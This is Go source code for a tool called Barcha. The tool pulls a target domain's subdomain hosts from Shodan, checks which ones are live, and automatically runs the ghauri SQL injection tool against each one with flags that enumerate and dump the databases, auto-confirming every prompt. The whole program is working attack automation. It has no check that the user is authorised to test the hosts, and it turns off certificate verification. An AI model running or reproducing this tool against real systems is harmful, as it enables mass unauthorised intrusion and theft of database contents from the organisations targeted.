package main

import (
    "crypto/tls"
    "database/sql"
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "os"
    "os/exec"
    "strings"
    "sync"
    "time"

    "github.com/fatih/color"
    "github.com/manifoldco/promptui"
    "github.com/olekukonko/tablewriter"
    _ "github.com/mattn/go-sqlite3"
)

const (
    toolName = "Barcha"
    version  = "1.0.0"
    dbFile   = "barcha_history.db"
)

var shodanClient = &http.Client{
    Timeout: 30 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
}

var scanClient = &http.Client{
    Timeout: 5 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    },
}

type ScanResult struct {
    IP   string
    Port string
    Live bool
}

type ShodanResponse struct {
    Matches []struct {
        IPStr string `json:"ip_str"`
        Port  int    `json:"port"`
    } `json:"matches"`
}

func main() {
    displayBanner()

    apiKey := os.Getenv("SHODAN_API_KEY")
    if apiKey == "" {
        fmt.Fprintln(os.Stderr, "Shodan API key is required. Set SHODAN_API_KEY.")
        os.Exit(1)
    }

    domain := promptDomain()
    results := shodanScan(apiKey, domain)
    saveToDB(domain, results)
    showResults(results)
    ghauriScan(results)
}

func displayBanner() {
    banner := color.CyanString(`
=============================================================
 ██████╗  █████╗ ██████╗  █████╗██╗  ██╗ █████╗ 
 ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔══██╗
 ██████╔╝███████║██████╔╝██║     ███████║███████║
 ██╔══██╗██╔══██║██╔══██╗██║     ██╔══██║██╔══██║
 ██████╔╝██║  ██║██║  ██║╚██████╗██║  ██║██║  ██║
 ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝

   v%s – SQL Injection Scanner (using Ghauri)
   Created by s1n6h | www.hackwithsingh.com
=============================================================
`, version)
    fmt.Print(banner + "\n")
}

func promptDomain() string {
    prompt := promptui.Prompt{
        Label: "Enter domain to scan (e.g. example.com)",
        Validate: func(input string) error {
            if strings.TrimSpace(input) == "" {
                return fmt.Errorf("cannot be empty")
            }
            return nil
        },
    }
    domain, err := prompt.Run()
    if err != nil {
        fmt.Fprintf(os.Stderr, "Prompt failed: %v\n", err)
        os.Exit(1)
    }
    return domain
}

func shodanScan(apiKey, domain string) []ScanResult {
    dork := fmt.Sprintf(
        `hostname:"*.%s" -403 -503 -http.title:"Invalid URL" -302 -404`, domain)
    url := fmt.Sprintf(
        "https://api.shodan.io/shodan/host/search?key=%s&query=%s",
        apiKey, dork,
    )
    resp, err := shodanClient.Get(url)
    if err != nil {
        fmt.Fprintf(os.Stderr, "Shodan request failed: %v\n", err)
        os.Exit(1)
    }
    defer resp.Body.Close()
    if resp.StatusCode != 200 {
        fmt.Fprintf(os.Stderr, "Shodan API returned %d\n", resp.StatusCode)
        os.Exit(1)
    }

    var sr ShodanResponse
    if err := json.NewDecoder(resp.Body).Decode(&sr); err != nil {
        fmt.Fprintf(os.Stderr, "Failed to parse Shodan JSON: %v\n", err)
        os.Exit(1)
    }

    sem := make(chan struct{}, 300)
    ch := make(chan ScanResult, len(sr.Matches))
    var wg sync.WaitGroup

    for _, m := range sr.Matches {
        wg.Add(1)
        go func(ip string, port int) {
            defer wg.Done()
            sem <- struct{}{}
            live := tcpCheck(ip, port)
            <-sem
            ch <- ScanResult{IP: ip, Port: fmt.Sprint(port), Live: live}
        }(m.IPStr, m.Port)
    }

    go func() {
        wg.Wait()
        close(ch)
    }()

    var results []ScanResult
    for r := range ch {
        results = append(results, r)
    }
    return results
}

func tcpCheck(ip string, port int) bool {
    addr := fmt.Sprintf("%s:%d", ip, port)
    conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
    if err != nil {
        return false
    }
    conn.Close()
    return true
}

func saveToDB(domain string, results []ScanResult) {
    db, err := sql.Open("sqlite3", dbFile)
    if err != nil {
        fmt.Fprintf(os.Stderr, "DB open error: %v\n", err)
        return
    }
    defer db.Close()

    db.Exec(`CREATE TABLE IF NOT EXISTS scans (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        domain TEXT,
        ip TEXT,
        port TEXT,
        live BOOLEAN,
        scan_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )`)

    for _, r := range results {
        db.Exec(
            "INSERT INTO scans(domain, ip, port, live) VALUES(?,?,?,?)",
            domain, r.IP, r.Port, r.Live,
        )
    }
}

func showResults(results []ScanResult) {
    fmt.Println("\nScan Results:")
    tbl := tablewriter.NewWriter(os.Stdout)
    tbl.SetHeader([]string{"IP", "Port", "Live"})
    for _, r := range results {
        status := "No"
        if r.Live {
            status = "Yes"
        }
        tbl.Append([]string{r.IP, r.Port, status})
    }
    tbl.Render()
}

func reverseLookup(ip string) string {
    names, err := net.LookupAddr(ip)
    if err != nil || len(names) == 0 {
        return ""
    }
    return strings.TrimSuffix(names[0], ".")
}

func ghauriScan(results []ScanResult) {
    color.Cyan("\nStarting Ghauri scans…")
    for _, r := range results {
        if !r.Live {
            continue
        }

        host := r.IP
        if name := reverseLookup(r.IP); name != "" {
            host = name
            fmt.Printf("[i] Resolved %s → %s\n", r.IP, host)
        }

        if strings.Contains(host, "amazonaws") {
            fmt.Printf("[!] Skipping %s (amazonaws)\n", host)
            continue
        }

        scheme := "http"
        if r.Port == "443" || r.Port == "8443" {
            scheme = "https"
        }
        target := fmt.Sprintf("%s://%s", scheme, host)

        resp, err := scanClient.Get(target)
        if err != nil {
            fmt.Printf("[!] Skipping %s — %v\n", target, err)
            continue
        }
        finalURL := resp.Request.URL.String()
        resp.Body.Close()

        if resp.StatusCode >= 400 {
            fmt.Printf("[!] Skipping %s — HTTP %d\n", finalURL, resp.StatusCode)
            continue
        }
        if finalURL != target {
            fmt.Printf("[i] Redirected: %s → %s\n", target, finalURL)
            target = finalURL
        }

        args := []string{
            "-u", target,
            "--random-agent",
            "--confirm",
            "--force-ssl",
            "--level=3",
            "--dbs",
            "--dump",
            "--batch",
        }
        cmdStr := "ghauri " + strings.Join(args, " ")
        fmt.Printf("\n[>] %s\n\n", cmdStr)

        cmd := exec.Command("ghauri", args...)
        cmd.Stdin = strings.NewReader("Y\n")
        cmd.Stdout = os.Stdout
        cmd.Stderr = os.Stderr

        if err := cmd.Run(); err != nil {
            fmt.Printf("  [!] Ghauri error on %s: %v\n", target, err)
        }
    }
}

func init() {
    if _, err := exec.LookPath("ghauri"); err != nil {
        fmt.Fprintln(os.Stderr, "ghauri not found; please install it.")
        os.Exit(1)
    }
}
